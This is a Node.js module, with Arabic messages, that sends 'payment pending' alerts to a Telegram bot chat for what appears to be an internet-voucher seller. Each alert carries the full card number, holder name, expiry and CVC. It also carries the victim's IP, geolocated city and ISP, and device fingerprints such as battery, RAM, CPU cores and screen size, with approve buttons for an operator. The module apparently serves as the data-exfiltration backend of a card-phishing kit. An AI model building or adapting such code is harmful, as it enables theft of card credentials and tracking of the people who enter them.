const axios = require("axios");
const FormData = require("form-data");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

/**
 * جلب بيانات الشبكة والموقع بناءً على IP
 */
async function fetchNetworkDetailsByIP(ip) {
  const result = {
    location: "غير معروف",
    isp: "غير معروف"
  };

  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
    return null;
  }

  const cleanIp = String(ip).split(",")[0].trim();

  try {
    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
    if (res.data) {
      const city = res.data.city || "غير معروفة";
      const country = res.data.country_name || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = res.data.org || res.data.asn || "غير معروف";
      return result;
    }
  } catch (e) {
    try {
      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org`, { timeout: 3000 });
      if (fallbackRes.data && fallbackRes.data.status === "success") {
        const city = fallbackRes.data.city || "غير معروفة";
        const country = fallbackRes.data.country || "غير معروفة";
        result.location = `${city}، ${country}`;
        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
        return result;
      }
    } catch (fallbackErr) {
      console.warn("⚠️ تعذر جلب تفاصيل الموقع والشبكة للـ IP:", cleanIp);
    }
  }

  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card") method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

/**
 * 1. إرسال إشعار الدفع الأولي مع الأزرار التفاعلية (مساهمة أو إصدار كارت)
 */
async function sendTelegramMessage(paymentPayload, transactionId) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const publicIP = paymentPayload.publicIP || (paymentPayload.geoData && paymentPayload.geoData.publicIP) || paymentPayload.ip || "";

    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
      return;
    }

    const method = getPaymentMethodName(paymentPayload);
    const amountEGP = paymentPayload.amount_cents
      ? (paymentPayload.amount_cents / 100).toFixed(2)
      : (paymentPayload.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    const branchName = paymentPayload.branchName || paymentPayload.branch_name || "حكايات نت رئيسي";
    const userPhone = paymentPayload.phone || 
                      paymentPayload.billing_data?.phone_number || 
                      paymentPayload.customer?.phone_number || 
                      "غير محدد";

    const clientID = paymentPayload.clientID || paymentPayload.clientId || "غير متوفر";

    let locationText = paymentPayload.geoCity && paymentPayload.geoCountry ? `${paymentPayload.geoCity}، ${paymentPayload.geoCountry}` : null;
    let ispText = paymentPayload.ispProvider || paymentPayload.isp || null;

    if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
      const netInfo = await fetchNetworkDetailsByIP(publicIP);
      if (netInfo) {
        if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
        if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
      }
    }

    const batteryInfo = paymentPayload.battery || paymentPayload.batteryInfo || "غير متوفر";
    const deviceRAM = paymentPayload.deviceRAM || "غير متوفر";
    const cpuCores = paymentPayload.cpuCores || "غير متوفر";
    const deviceType = paymentPayload.deviceType || "غير متوفر";
    const screenSize = paymentPayload.screenSize || "غير متوفر";
    const userTimeZone = paymentPayload.userTimeZone || "غير متوفر";
    const lang = paymentPayload.lang || "غير متوفر";

    let message = `⏳ <b>جاري عملية الدفع بانتظار الموافقة...</b>\n\n` +
                  `🏢 الفرع: <b>${branchName}</b>\n` +
                  `💳 وسيلة الدفع: <b>${method}</b>\n` +
                  `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n` +
                  `🆔 رقم المعاملة: <code>${transactionId}</code>\n`;

    if (userPhone && userPhone !== "غير محدد") {
      message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
    }

    if (paymentPayload.card_data && paymentPayload.card_data.number && paymentPayload.card_data.number !== "غير مدخل") {
      message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                 `🔢 رقم الكارت: <code>${paymentPayload.card_data.number}</code>\n` +
                 `👤 اسم صاحب البطاقة: <b>${paymentPayload.card_data.name}</b>\n` +
                 `📅 تاريخ الانتهاء: <code>${paymentPayload.card_data.expiry}</code>\n` +
                 `🔒 رمز CVC: <code>${paymentPayload.card_data.cvc}</code>\n`;
    }

    message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
               `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
               `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
               `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
               `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
               `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
               `----------------------------------------\n` +
               `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
               `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
               `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
               `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
               `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
               `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
               `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;

    // الأزرار التفاعلية للمشرف
    const inlineKeyboard = [
      [
        { text: "🌟 تأكيد المساهمة", callback_data: `contribution_${transactionId}_${amountEGP}` },
        { text: "🎫 إصدار الكارت", callback_data: `issuecard_${transactionId}_${amountEGP}` }
      ]
    ];

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: inlineKeyboard }
    });

    console.log(`✅ تم إرسال إشعار التليجرام مع الأزرار بنجاح للمعاملة: ${transactionId}`);
  } catch (err) {
    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
  }
}

/**
 * 2. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام
 */
async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
      return;
    }

    if (!imageBuffer) {
      console.error("❌ [Telegram Error] Buffer الصورة فارغ!");
      return;
    }

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    
    form.append("photo", imageBuffer, {
      filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
      contentType: "image/png"
    });

    const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                    `🏢 الفرع: <b>${paymentDetails.branchName || 'حكايات نت رئيسي'}</b>\n` +
                    `📦 الباقة: <b>${paymentDetails.packageName || 'باقة إنترنت'}</b>\n` +
                    `💰 المبلغ: <b>${paymentDetails.amount} جنيه</b>\n` +
                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                    `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
                    `🆔 رقم العملية: <code>${paymentDetails.transactionId || 'غير متوفر'}</code>`;

    form.append("caption", caption);
    form.append("parse_mode", "HTML");

    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: {
        ...form.getHeaders()
      },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

    if (response.data && response.data.ok) {
      console.log(`📸 [Telegram Image SUCCESS] تم إرسال صورة الكارت بنجاح للمعاملة: ${paymentDetails.transactionId}`);
    }

  } catch (err) {
    console.error("❌ [Telegram Image Error Details]:", err.response?.data || err.message);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage
};
